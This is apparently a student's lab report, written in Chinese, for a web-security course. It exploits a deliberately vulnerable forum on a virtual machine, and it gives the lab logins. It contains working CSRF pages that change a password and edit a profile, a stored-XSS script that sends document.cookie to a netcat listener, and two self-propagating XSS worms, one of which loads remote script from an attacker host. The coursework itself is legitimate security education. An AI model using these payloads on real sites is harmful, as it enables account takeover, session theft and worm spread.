> [[lec3-public_unlocked.pdf]]
> [[【1.1】CSRF攻击]]
> [[【1.2】XSS攻击]]
> [[web-hw1-public-2025Aut_unlocked.pdf]]

文件密码Cst.1010
user: student
pwd: student

环境解析：虚拟机 web-hw1 同时作为 Web 站点服务器与数据库服务器，并部署 Web 应用 Research Forum

代码文件在/var/www/forum目录下

| name | alice | bob | charlie | samy |
| ---- | ----- | --- | ------- | ---- |
| pwd  | alice | bob | charlie | samy |
url http://www.forum.com


## Task1: 
（1）请描述 samy 该如何构造恶意网页内容才能实现这一攻击目标

 samy构造的链接改变其中password的值，构造在自己的链接里面，Alice跳转后发现密码被修改

（2）请实现该攻击，并截图记录恶意网页代码内容、攻击过程与结果
恶意网页代码内容

攻击过程：
在task1.html里面写好内容：
![[Pasted image 20251030173800.png]]
samy在文件里面创建message：

![[Pasted image 20251030173321.png]]
登录alice账户
![[Pasted image 20251030174310.png]]
进入message board后点击消息跳转http://www.samy.com/task1.html
![[Pasted image 20251030174354.png]]
退出登录后发现密码已经被修改

（3）随作业报告提交恶意网页代码，命名为 task1-SY2539220.html
```html
<html>
<body>
<h1>Welcome to this page</h1>
<img width=0 height=0 src=http://www.forum.com/account_edit.php?password=alice-new&submit=submit>
</body>
</html>
```

## Task2
（1）请结合观察到的 POST 请求，说明上述代码中的部分应该如何填充
![[Pasted image 20251105153200.png]]
简介为 SY2539220 is my Hero
content=SY2539220 is my Hero&field=brief&submit=submit
![[Pasted image 20251105153247.png]]
（2）请实现攻击，截图记录攻击过程与结果（10 分）
alice登录：
![[Pasted image 20251105154207.png]]
初始brief description：
![[Pasted image 20251105154319.png]]

然后访问恶意网址http://www.samy.com/task2.html

![[Pasted image 20251105155343.png]]
此时查询
![[Pasted image 20251105155409.png]]
（3）随作业报告提交恶意网页代码，命名为 task2-学号.html（5 分）。
```html
<html>

<body>

<h1>Hello</h1>

<script type="text/javascript">

function forge_post()

{

var fields;

// 填充伪造 POST 请求的内容

fields += "<input type='hidden' name='content' value='SY2539220 is my Hero'>";

fields += "<input type='hidden' name='field' value='brief'>";


var p = document.createElement("form");

// 构造表单

p.action = "http://www.forum.com/info_edit.php";

//该栏需填入 POST 请求应发往的地址

p.innerHTML = fields;

p.method = "post";

// 在当前页面插入表单并提交

document.body.appendChild(p);

p.submit();

}

// 在页面加载后提交 POST 请求

window.onload = function() { forge_post();}

</script>

</body>

</html>

```


## Warm-up Task
```
<script>alert(document.cookie);</script>
```
![[Pasted image 20251105160026.png]]
## Task3

（1）请以 samy 的账户修改自己的简介，包含上述恶意代码，实现对其他用户的 Cookie 窃取攻击。截图记录攻击过程与结果（10 分）；
确定攻击代码
```
<script>

document.write('<img src=http://127.0.0.1:5555?c=' + escape(document.cookie) + '>');

</script>
```
通过netcat 工具打开5555端口监听
```
nc -l -p 5555
```
修改samy的个人简介，插入脚本
![[Pasted image 20251105171747.png]]

alice访问samy，自动发送信息给5555端口

![[Pasted image 20251105171937.png]]
（2）请解释该 XSS 攻击的类型，并说明此次攻击的完整流程
这算是存储型XSS，攻击者将恶意脚本永久存储在服务器中的个人简介中，然后alice登录到论坛网站中，alice访问samy的简介，服务器返回带恶意脚本的响应，恶意样本在浏览器中执行，发送cookie给攻击者

## Task 4


（1）请结合观察到的修改简介 HTTP POST 请求，说明上述代码中的部分应该如何填充（10 分）；
![[Pasted image 20251106121310.png]]
填充内容：
```html
var content="content=I'm SY2539220&field=brief&submit=submit";
	
var sendurl="http://www.forum.com/info_edit.php";
```


（2）请实现攻击，截图记录攻击过程与结果（5 分）
samy初步修改：
![[Pasted image 20251106121615.png]]

alice登录并查看自己的原始query
![[Pasted image 20251106120554.png]]
然后访问samy的自我简介
![[Pasted image 20251106121912.png]]
此时已经修改，查看自己：
![[Pasted image 20251106121929.png]]
说明已经实现攻击
（3）请回答问题：在 samy 修改了自己的简介后，若他查看了自己账户的简介，会对攻击造成什么影响？请实验验证（10 分）。
samy查看后同样会把自己的内容修改，然后就无法继续传播了
**实验验证**
初始查看自己的内容：
![[Pasted image 20251106121651.png]]
再次查询自己，发现内容已经修改：
![[Pasted image 20251106121701.png]]（4）随作业报告提交攻击代码，命名为 task4-SY2539220.js（5 分）
```html
<script type="text/javascript">

window.onload = function(){
	// 构造修改简介的 HTTP 请求，由于是 POST 请求，需要构造请求的Content
	
	var content="content=I'm SY2539220&field=brief&submit=submit";
	
	var sendurl="http://www.forum.com/info_edit.php";
	
	// 构造并发送 Ajax 请求
	
	var Ajax=null;
	
	Ajax=new XMLHttpRequest();
	
	Ajax.open("POST",sendurl,true);
	
	Ajax.setRequestHeader("Host","www.forum.com");
	
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	
	Ajax.send(content);

}

</script>
```

## Task 5

（1）请在作业报告中截图记录攻击过程与结果，要求验证“自我繁殖”功能，即用户 A 感染蠕虫病毒后，用户 B 查看用户 A 的简介，也会遭受攻击（两种攻击的攻击过程与结果验证各 20 分）
1. Link Approach
	samy首先修改自己的内容：
	![[Pasted image 20251106163224.png]]
	
	alice登录并查询自己的简介：
	![[Pasted image 20251106163304.png]]
	alice查看samy的内容：
	![[Pasted image 20251106163323.png]]
	alice此时已经被篡改：
	![[Pasted image 20251106163336.png]]
1. DOM Approach
	samy首先修改自己的内容
	![[Pasted image 20251106163435.png]]
	alice查询自己的简介：
	![[Pasted image 20251106153148.png]]
	alice查询samy的简介
	![[Pasted image 20251106163516.png]]
	alice查看自己的简介：
	![[Pasted image 20251106163558.png]]
	已经被篡改
	
（2）随作业报告提交攻击代码，分别命名为 task5-link-SY2539220.js 与 task5-dom-SY2539220.js（两种攻击的代码各 5 分）。

2. Link Approach
```html
<script type='text/javascript' src='http://www.samy.com/worm.js'></script>
```
worm.js内容：
```js
	window.onload = function(){
		var headerTag = "<script type=\'text/javascript\' src=\'http://www.samy.com/worm.js\'>";
		var jsCode = " ";
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
		var sendurl="http://www.forum.com/info_edit.php";
		var content="content=" + wormCode + "&field=brief&submit=submit";
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.forum.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}
```
2. DOM Approach
```html
<script id=worm>
var headerTag = "<script id=\'worm\' type=\'text/javascript\'>";
var jsCode = document.getElementById("worm").innerHTML;
var tailTag = "</" + "script>";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
alert(jsCode);
var sendurl="http://www.forum.com/info_edit.php";
var content="content=" + wormCode + "&field=brief&submit=submit";
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.forum.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(content);
</script>
```
